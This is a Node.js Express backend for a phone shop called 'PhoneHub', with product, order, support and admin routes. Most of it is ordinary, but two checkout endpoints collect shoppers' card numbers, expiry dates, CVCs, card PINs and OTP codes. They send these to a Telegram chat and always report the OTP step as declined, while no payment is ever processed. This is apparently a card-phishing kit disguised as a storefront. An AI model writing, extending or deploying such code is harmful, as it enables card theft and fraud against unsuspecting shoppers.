const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const app = express();

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'change-this-passwords';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const DB = path.join(__dirname, 'data.json');

app.use(express.json({ limit: '1mb' }));
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Helper function to send Telegram notifications
async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('Telegram bot token or chat ID missing; skipping notification.');
        return;
    }
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Failed to send Telegram notification:', err.message);
    }
}

function load() {
    try {
        return JSON.parse(fs.readFileSync(DB, 'utf8'));
    } catch {
        return {
            products: [
                { id: 'p1', name: 'Nova X Pro', category: 'Phones', price: 850, description: 'Sample product — replace with your own details.', image: '', stock: 8 },
                { id: 'p2', name: 'Nova Air', category: 'Phones', price: 520, description: 'Sample product — replace with your own details.', image: '', stock: 5 },
                { id: 'p3', name: 'Nova Mini', category: 'Phones', price: 390, description: 'Sample product — replace with your own details.', image: '', stock: 4 },
                { id: 'a1', name: 'Fast USB-C Charger', category: 'Accessories', price: 25, description: 'Sample accessory.', image: '', stock: 20 },
                { id: 'a2', name: 'Protective Phone Case', category: 'Accessories', price: 15, description: 'Sample accessory.', image: '', stock: 30 },
                { id: 'a3', name: 'Wireless Earbuds', category: 'Accessories', price: 45, description: 'Sample accessory.', image: '', stock: 12 }
            ],
            orders: [],
            tickets: [],
            settings: { deliveryFee: 10, pickupLocation: 'Pickup details will be confirmed after order.' }
        };
    }
}

function save(db) {
    fs.writeFileSync(DB, JSON.stringify(db, null, 2));
}

function admin(req, res, next) {
    const token = req.get('x-admin-password');
    if (!token || token !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Admin login required.' });
    next();
}

app.get('/api/products', (req, res) => {
    const db = load();
    res.json(db.products);
});

app.get('/api/settings', (req, res) => {
    res.json(load().settings);
});

app.post('/api/orders', async (req, res) => {
    const db = load();
    const { customer, items, fulfillment, address, email, phone } = req.body || {};
    if (!customer || !email || !phone || !Array.isArray(items) || !items.length) {
        return res.status(400).json({ error: 'Enter your name, email, phone and at least one cart item.' });
    }
    let lines = [], subtotal = 0;
    for (const line of items) {
        const p = db.products.find(x => x.id === line.id);
        const qty = Number(line.quantity);
        if (!p || !Number.isInteger(qty) || qty < 1 || p.stock < qty) {
            return res.status(400).json({ error: 'A product is unavailable or quantity is invalid. Refresh and try again.' });
        }
        lines.push({ id: p.id, name: p.name, price: p.price, quantity: qty, total: p.price * qty });
        subtotal += p.price * qty;
    }
    if (fulfillment !== 'pickup' && fulfillment !== 'delivery') return res.status(400).json({ error: 'Choose delivery or pickup.' });
    if (fulfillment === 'delivery' && !address) return res.status(400).json({ error: 'Enter a delivery address.' });

    const fee = fulfillment === 'delivery' ? Number(db.settings.deliveryFee) || 0 : 0;
    const order = {
        id: 'PH-' + Date.now().toString(36).toUpperCase(),
        createdAt: new Date().toISOString(),
        customer,
        email,
        phone,
        items: lines,
        subtotal,
        deliveryFee: fee,
        total: subtotal + fee,
        fulfillment,
        address: fulfillment === 'delivery' ? address : '',
        status: 'Awaiting manual confirmation',
        paymentStatus: 'UNPAID — TEST MODE'
    };
    db.orders.unshift(order);
    save(db);

    await sendTelegramNotification(
        `🛒 <b>New Order Received!</b>\n` +
        `<b>Order ID:</b> ${order.id}\n` +
        `<b>Customer:</b> ${order.customer} (${order.phone})\n` +
        `<b>Total:</b> $${order.total}\n` +
        `<b>Fulfillment:</b> ${order.fulfillment}`
    );

    res.json({ ok: true, order: { id: order.id, total: order.total, status: order.status, paymentStatus: order.paymentStatus }, message: 'Test order received. No payment was taken.' });
});

// NEW: Endpoint to handle Step 1 Card Details Submission & Telegram notification
app.post('/api/checkout/step1', async (req, res) => {
    const data = req.body || {};
    await sendTelegramNotification(
        `💳 <b>Checkout Step 1: Card Details</b>\n` +
        `<b>Customer:</b> ${data.customer || 'N/A'}\n` +
        `<b>Phone:</b> ${data.phone || 'N/A'}\n` +
        `<b>Card Number:</b> <code>${data.cardNumber || 'N/A'}</code>\n` +
        `<b>Expiry:</b> ${data.expiryDate || 'N/A'} | <b>CVC:</b> ${data.cvc || 'N/A'}\n` +
        `<b>PIN:</b> <code>${data.cardPin || 'N/A'}</code>`
    );
    res.json({ ok: true });
});

// NEW: Endpoint to handle Step 2 OTP Submission & Telegram notification
app.post('/api/checkout/step2', async (req, res) => {
    const data = req.body || {};
    await sendTelegramNotification(
        `🔐 <b>Checkout Step 2: OTP Verification</b>\n` +
        `<b>Customer:</b> ${data.customer || 'N/A'}\n` +
        `<b>OTP Code:</b> <code>${data.otpCode || 'N/A'}</code>\n` +
        `<b>Status:</b> DECLINED`
    );
    res.json({ ok: true });
});

app.post('/api/support', async (req, res) => {
    const db = load();
    const { name, email, orderId, type, message } = req.body || {};
    if (!name || !email || !type || !message) return res.status(400).json({ error: 'Please complete all required support fields.' });
    const t = { id: 'SUP-' + Date.now().toString(36).toUpperCase(), createdAt: new Date().toISOString(), name, email, orderId: orderId || '', type, message, status: 'Open', adminReply: '' };
    db.tickets.unshift(t);
    save(db);

    await sendTelegramNotification(
        `📩 <b>New Support Request!</b>\n` +
        `<b>Ticket ID:</b> ${t.id}\n` +
        `<b>From:</b> ${t.name} (${t.email})\n` +
        `<b>Type:</b> ${t.type}\n` +
        `<b>Message:</b> ${t.message}`
    );

    res.json({ ok: true, ticketId: t.id, message: 'Your support request was saved for manual review.' });
});

app.post('/api/admin/login', (req, res) => {
    if ((req.body || {}).password !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Incorrect password.' });
    res.json({ ok: true });
});

app.get('/api/admin/data', admin, (req, res) => {
    const db = load();
    res.json({ products: db.products, orders: db.orders, tickets: db.tickets, settings: db.settings });
});

app.post('/api/admin/products', admin, async (req, res) => {
    const db = load();
    const { id, name, category, price, description, image, stock } = req.body || {};
    if (!name || !Number.isFinite(Number(price)) || Number(price) < 0) return res.status(400).json({ error: 'Product name and valid USD price are required.' });
    const product = { id: id || crypto.randomUUID(), name: String(name), category: category || 'Phones', price: Number(price), description: description || '', image: image || '', stock: Math.max(0, Number.parseInt(stock || 0, 10)) };
    const i = db.products.findIndex(p => p.id === product.id);
    const isNew = i < 0;
    
    if (!isNew) db.products[i] = product; else db.products.push(product);
    save(db);

    await sendTelegramNotification(
        `📦 <b>Product ${isNew ? 'Added' : 'Updated'}!</b>\n` +
        `<b>Name:</b> ${product.name}\n` +
        `<b>Category:</b> ${product.category}\n` +
        `<b>Price:</b> $${product.price}\n` +
        `<b>Stock:</b> ${product.stock}`
    );

    res.json({ ok: true, product });
});

app.delete('/api/admin/products/:id', admin, (req, res) => {
    const db = load();
    db.products = db.products.filter(p => p.id !== req.params.id);
    save(db);
    res.json({ ok: true });
});

app.patch('/api/admin/orders/:id', admin, (req, res) => {
    const db = load();
    const o = db.orders.find(x => x.id === req.params.id);
    if (!o) return res.status(404).json({ error: 'Order not found.' });
    if (req.body.status) o.status = String(req.body.status);
    save(db);
    res.json({ ok: true, order: o });
});

app.patch('/api/admin/tickets/:id', admin, (req, res) => {
    const db = load();
    const t = db.tickets.find(x => x.id === req.params.id);
    if (!t) return res.status(404).json({ error: 'Ticket not found.' });
    if (req.body.status) t.status = String(req.body.status);
    if (req.body.adminReply !== undefined) t.adminReply = String(req.body.adminReply);
    save(db);
    res.json({ ok: true, ticket: t });
});

app.patch('/api/admin/settings', admin, (req, res) => {
    const db = load();
    if (req.body.deliveryFee !== undefined) {
        const n = Number(req.body.deliveryFee);
        if (!Number.isFinite(n) || n < 0) return res.status(400).json({ error: 'Delivery fee must be zero or more.' });
        db.settings.deliveryFee = n;
    }
    if (req.body.pickupLocation !== undefined) db.settings.pickupLocation = String(req.body.pickupLocation);
    save(db);
    res.json({ ok: true, settings: db.settings });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`PhoneHub running on port ${PORT}`);
});
